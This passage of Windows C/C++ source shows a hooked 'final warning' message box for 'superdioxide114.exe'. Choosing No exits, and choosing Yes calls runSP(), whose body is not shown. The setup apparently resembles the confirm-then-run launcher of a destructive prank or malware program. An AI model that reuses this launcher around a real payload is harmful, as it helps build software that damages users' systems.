        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        if (MessageBoxW(0, MessageTextSecond, L"superdioxide114.exe-最后一次警告", MB_ICONERROR + MB_YESNO + MB_DEFBUTTON2) == IDNO) { UnhookWindowsHookEx(hook); ExitProcess(0); }
        else {
            UnhookWindowsHookEx(hook);
            runSP();
        }
    }
    return 0;
}